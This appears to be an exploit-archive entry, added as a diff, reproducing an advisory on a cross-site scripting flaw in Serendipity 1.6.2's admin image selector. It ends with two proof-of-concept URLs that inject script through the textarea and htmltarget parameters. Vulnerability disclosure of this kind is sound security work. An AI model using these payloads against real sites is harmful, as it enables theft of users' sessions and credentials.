@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/61138/info
+
+Serendipity is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Serendipity 1.6.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/serendipity_admin_image_selector.php?serendipity%5Btextarea%5D=%27%2Balert(0x000887)%2B%27&serendipity%5Baction%5D=208.100.0.117
+&serendipity%5BadminAction%5D=208.100.0.117&serendipity%5BadminModule%5D=208.100.0.117
+&serendipity%5Bstep%5D=default&serendipity%5Bonly_path%5D=208.100.0.117
+
+http://www.example.com/serendipity_admin_image_selector.php?serendipity%5Bhtmltarget%5D=%27%2Balert(0x000A02)%2B%27&serendipity%5Baction%5D=208.100.0.117&serendipity%5BadminAction%5D=208.100.0.117&serendipity%5BadminModule%5D=208.100.0.117&serendipity%5Bstep%5D=default&serendipity%5Bonly_path%5D=208.100.0.117 
